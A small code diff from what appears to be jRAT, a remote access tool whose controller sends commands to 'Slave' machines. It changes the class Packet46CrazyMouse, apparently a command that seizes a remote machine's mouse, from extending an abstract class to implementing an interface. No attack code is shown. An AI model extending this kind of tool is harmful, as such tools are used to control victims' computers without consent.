@@ -3,7 +3,7 @@ package jrat.controller.packets.outgoing;
 import jrat.controller.Slave;
 
 
-public class Packet46CrazyMouse extends AbstractOutgoingPacket {
+public class Packet46CrazyMouse implements OutgoingPacket {
 
 	private int seconds;
 
